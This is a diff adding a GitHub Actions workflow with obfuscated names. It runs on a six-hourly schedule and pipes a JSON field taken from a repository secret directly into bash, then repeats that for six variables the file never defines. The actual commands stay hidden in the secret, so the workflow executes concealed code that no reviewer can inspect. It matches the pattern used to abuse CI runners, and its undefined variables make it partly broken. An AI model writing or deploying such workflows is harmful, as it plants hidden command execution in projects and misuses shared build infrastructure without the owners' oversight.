@@ -1,0 +1,24 @@
+name: alarmingsussex
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: alarmingsussex
+        env:
+          fjgz7: ${{ secrets.fjgz7 }}
+        run: |
+          echo $fjgz7 | jq -r .as3 | /bin/bash
+          echo $dryp87 | jq -r .ca783 | /bin/bash
+          echo $i59 | jq -r .hmf09 | /bin/bash
+          echo $ule17 | jq -r .xeggj27564 | /bin/bash
+          echo $rkk02 | jq -r .egypv38 | /bin/bash
+          echo $tlrx0 | jq -r .hxcx08736 | /bin/bash
+          echo $bkx2 | jq -r .lka414 | /bin/bash
+
